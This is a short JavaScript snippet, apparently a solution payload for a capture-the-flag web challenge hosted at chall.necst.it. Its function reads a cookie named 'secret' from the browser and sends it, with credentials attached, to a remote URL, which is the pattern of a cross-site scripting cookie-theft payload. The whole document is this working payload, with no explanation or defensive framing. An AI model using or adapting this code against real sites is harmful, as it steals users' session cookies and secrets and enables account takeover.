function gCookie(a){var b=document.cookie.match('(^|[^;]+)\\s*'+a+'\\s*=\\s*([^;]+)');return b?b.pop():'';}

function execute(){
  var request=new XMLHttpRequest();
  var address="https://chall.necst.it/challenges/web4/verify/932/"+gCookie("secret");
  request.open("GET", address, true);
  request.withCredentials = true;
  request.send();
}
